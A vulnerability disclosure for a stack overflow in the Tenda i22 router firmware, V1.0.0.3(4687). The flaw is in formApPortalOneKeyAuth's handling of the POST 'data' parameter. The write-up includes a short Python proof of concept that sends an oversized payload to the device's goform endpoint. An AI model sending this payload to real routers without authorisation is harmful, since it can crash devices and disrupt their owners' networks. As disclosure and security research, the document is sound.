## Overview

- Manufacturer's website: https://www.tenda.com.cn
- Firmware download website: https://www.tenda.com.cn/download/detail-2747.html

## Affected version

i22 V1.0.0.3(4687)

## Vulnerability details

In the i22 V1.0.0.3(4687) firmware has a stack overflow vulnerability in the `formApPortalOneKeyAuth` function. This function accepts the `data` parameter from a POST request. The parameter is later copied by `strcpy` or `sprintf` to a variable on the stack (`v19` ) , causing a stack overflow.

![image1](image/1.png)

## PoC

```python
import requests
from pwn import*

ip = "192.168.244.3"
url = "http://" + ip + "/goform/apPortalOneKeyAuth"
payload = b"a"*0x6000

data = {
    "data": payload
}

response = requests.post(url, data=data)
print(response.text)
```

![demo](image/demo.png)
